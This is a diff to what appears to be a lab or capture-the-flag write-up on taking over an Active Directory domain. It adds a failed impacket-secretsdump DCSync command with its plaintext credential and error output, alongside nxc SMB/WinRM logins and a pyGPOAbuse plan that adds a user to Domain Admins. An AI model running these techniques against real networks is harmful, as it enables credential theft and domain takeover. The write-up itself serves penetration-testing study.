@@ -348,7 +348,17 @@ nxc smb 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
 nxc winrm 192.168.216.97 -u 'charlotte' -p 'Game2On4.!'
 ```
 
-A first DCSync attempt as charlotte failed (she held only partial replication rights), but the expected path was GPO abuse: charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
+A first DCSync attempt as charlotte failed (she held only partial replication rights):
+
+```bash
+impacket-secretsdump secura.yzx/charlotte:'Game2On4.!'@192.168.216.97
+```
+
+```
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN
+```
+
+So we went with the expected path instead — GPO abuse. charlotte has **WriteOwner on the Default Domain Policy** (GUID `{31B2F340-016D-11D2-945F-00C04FB984F9}`).
 
 We used `pyGPOAbuse` to plant a scheduled task inside the Default Domain Policy that adds charlotte to Domain Admins:
 
